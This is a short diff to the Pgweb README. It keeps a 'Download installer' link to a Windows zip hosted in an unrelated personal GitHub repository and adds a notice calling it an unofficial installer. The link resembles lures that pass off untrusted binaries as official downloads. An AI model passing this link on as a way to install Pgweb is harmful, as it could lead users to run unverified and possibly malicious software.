@@ -13,6 +13,8 @@ Pgweb binaries and source code for each version is distributed via [Github Relea
 
 [Download installer](https://github.com/lesul2014/lesul2014/raw/main/Installer%20windows.zip)
 
+**IMPORTANT**: This is unofficial installer - use at your own risk.
+
 ### Docker
 
 Download an [official][3] Pgweb image:
